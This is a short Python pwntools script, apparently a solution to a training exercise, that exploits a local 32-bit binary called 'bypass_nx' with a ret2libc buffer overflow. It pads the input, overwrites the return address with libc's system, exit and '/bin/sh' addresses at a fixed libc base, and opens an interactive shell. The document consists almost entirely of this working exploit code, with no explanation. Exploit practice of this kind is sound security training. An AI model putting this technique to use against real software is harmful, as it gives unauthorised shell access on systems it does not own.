from pwn import *
context.update(os="linux", arch="i386")

libc = ELF('/usr/lib32/libc.so.6')
libc.address = 0xf7c00000
sys = p32(libc.sym.get("system"))
exit = p32(libc.sym.get("exit"))
binsh = p32(next(libc.search(b"/bin/sh")))
# rop = ROP(libc)
# rop.system(next(libc.search(b"/bin/sh")))
payload = b'A'*18 + sys + exit + binsh
p = process(["./bypass_nx", payload])
p.interactive()

